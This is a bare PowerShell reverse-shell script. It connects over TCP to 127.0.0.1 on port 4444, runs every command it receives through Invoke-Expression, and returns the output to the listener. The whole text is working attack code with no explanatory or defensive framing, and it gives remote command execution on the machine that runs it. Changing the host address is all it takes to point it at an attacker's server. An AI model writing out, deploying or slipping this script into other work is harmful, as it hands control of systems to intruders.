$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);

$stream = $client.GetStream();

# zero out the byte array
# byte array b = for i in {0..65535}; do echo 0; done
[byte[]]$b = 0..65535 | %{0};

while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
  $sb = (IEX $data 2>&1 | Out-String );
  $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
  $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
  $stream.Write($sbt,0,$sbt.Length);
  $stream.Flush();
};

$client.Close();
